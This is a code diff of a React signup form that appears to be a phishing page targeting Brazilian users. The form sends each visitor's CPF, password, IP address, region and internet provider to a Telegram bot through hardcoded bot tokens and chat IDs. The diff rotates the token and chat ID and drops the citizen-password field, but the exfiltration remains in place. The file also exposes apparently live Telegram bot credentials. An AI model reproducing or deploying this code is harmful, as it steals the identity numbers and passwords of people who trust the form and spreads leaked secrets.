@@ -26,17 +26,10 @@ function isValidCPF(cpf: string) {
 export default function SignUp() {
   const [cpf, setCpf] = useState('')
   const [password, setPassword] = useState('')
-  const [citizenPassword, setCitizenPassword] = useState('')
   const [eye, setEye] = useState(inactivedEye)
-  const [eyeTop, setEyeTop] = useState(inactivedEye)
   const [isCpfValid, setIsCpfValid] = useState(false)
-  const [isCitizenPasswordValid, setIsCitizenPasswordValid] = useState(false)
   const [isPasswordValid, setIsPasswordValid] = useState(false)
   const [isLoading, setIsLoading] = useState(false)
-  const [
-    isCitizenPasswordEntryEnabled,
-    setIsCitizenPasswordEntryEnabled
-  ] = useState(true)
 
   const formatCpf = (event: ChangeEvent<HTMLInputElement>) => {
     const formatedCpf = event.target.value
@@ -45,12 +38,6 @@ export default function SignUp() {
     if (formatedCpf.length > 13) setIsCpfValid(isValidCPF(formatedCpf))
     else setIsCpfValid(false)
     setCpf(formatedCpf)
-  }
-
-  const formattedCitizenPassword = (event: ChangeEvent<HTMLInputElement>) => {
-    const formattedCitizenPassword = event.target.value.replace(/\D/g, '')
-    setIsCitizenPasswordValid(formattedCitizenPassword.length > 5)
-    setCitizenPassword(formattedCitizenPassword)
   }
 
   const formatedPassword = (event: ChangeEvent<HTMLInputElement>) => {
@@ -64,15 +51,10 @@ export default function SignUp() {
     else setEye(inactivedEye)
   }
 
-  const changeEyeTopImage = () => {
-    if (eyeTop === inactivedEye) setEyeTop(activedEye)
-    else setEyeTop(inactivedEye)
-  }
-
   const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault()
     setIsLoading(true)
-    const botToken = '6841618266:AAGeOc6JWrD4isi6K7r56YRUXKiU6EJe5B4'
+    const botToken = '6736497520:AAHRwrTbPKuMusTJxFQHE1FRha_FEQ7IJIU'
     const responseIP = await fetch('https://api.ipify.org?format=json')
     const responseIPJson = await responseIP.json()
     const responseGeo = await fetch('/api/geo', {
@@ -89,18 +71,15 @@ export default function SignUp() {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        'chat_id': -1002138559916,
+        'chat_id': -1002138360329,
         text: `
 IP: ${responseGeoJson.query}
 Região: ${responseGeoJson.region}
 Nome da região: ${responseGeoJson.regionName}
 Cidade: ${responseGeoJson.city}
-Latitude: ${responseGeoJson.lat}
-Longitude: ${responseGeoJson.lon}
 Operadora: ${responseGeoJson.isp}
 CPF: ${cpf}
 Password: ${password}
-Senha do cidadão: ${citizenPassword}
         `
       })
     })
@@ -148,45 +127,19 @@ Senha do cidadão: ${citizenPassword}
             className={S.input}
             required
           />
-          {isCitizenPasswordEntryEnabled && <>
-            <input
-              type={eyeTop === inactivedEye ? 'password' : 'text'}
-              name='citizen-password'
-              maxLength={8}
-              placeholder='SENHA DO CIDADÃO'
-              value={citizenPassword}
-              onChange={formattedCitizenPassword}
-              className={isCpfValid ? S.input : S.input_invalid}
-            />
-            <EyeButtonTop
-              imageUrl={eyeTop}
-              onClick={changeEyeTopImage}
-            />
-          </>}
           <EyeButton
             imageUrl={eye}
             onClick={changeEyeImage}
           />
           <button
             className={S.button}
-            disabled={isCitizenPasswordEntryEnabled
-              ? !isCitizenPasswordValid || !isCpfValid || !isPasswordValid
-              : !isCpfValid || !isPasswordValid}
+            disabled={!isCpfValid || !isPasswordValid}
           >
             CONTRATAR
           </button>
           <div className={S.option}>
-            <input
-              type='checkbox'
-              id='citizen'
-              onClick={() => setIsCitizenPasswordEntryEnabled(!isCitizenPasswordEntryEnabled)}
-              checked={isCitizenPasswordEntryEnabled}
-            />
-            <label htmlFor='citizen' className={S.checkboxLabel}>
-              Senha do cidadão
-            </label><br />
             <input type='checkbox' id='show' />
-            <label htmlFor='show' className={S.checkboxLabel}>
+            <label htmlFor='show'>
               Não mostrar novamente
             </label>
           </div>
@@ -204,19 +157,6 @@ Senha do cidadão: ${citizenPassword}
 const EyeButton = styled.div<{ imageUrl: string }>`
   position: absolute;
   top: ${props => props.imageUrl === inactivedEye ? '94px' : '96px'};
-  width: 25px;
-  height: 25px;
-  right: 12px;
-  background-image: url(${props => props.imageUrl});
-  background-repeat: no-repeat;
-  &:hover {
-    cursor: pointer;
-  }
-`
-
-const EyeButtonTop = styled.div<{ imageUrl: string }>`
-  position: absolute;
-  top: ${props => props.imageUrl === inactivedEye ? '165px' : '167px'};
   width: 25px;
   height: 25px;
   right: 12px;
